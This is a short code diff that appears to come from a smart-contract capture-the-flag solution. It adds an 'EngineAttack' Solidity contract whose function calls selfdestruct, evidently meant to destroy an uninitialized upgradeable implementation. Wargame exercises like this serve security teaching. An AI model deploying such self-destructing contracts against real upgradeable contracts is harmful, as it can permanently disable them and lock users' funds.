@@ -126,3 +126,11 @@ contract Engine is Initializable {
         r.value = newImplementation;
     }
 }
+
+contract EngineAttack {
+    bool public isAlive = true;
+
+    function selfDestruct() public {
+        selfdestruct(0x0000000000000000000000000000000000000000);
+    }
+}
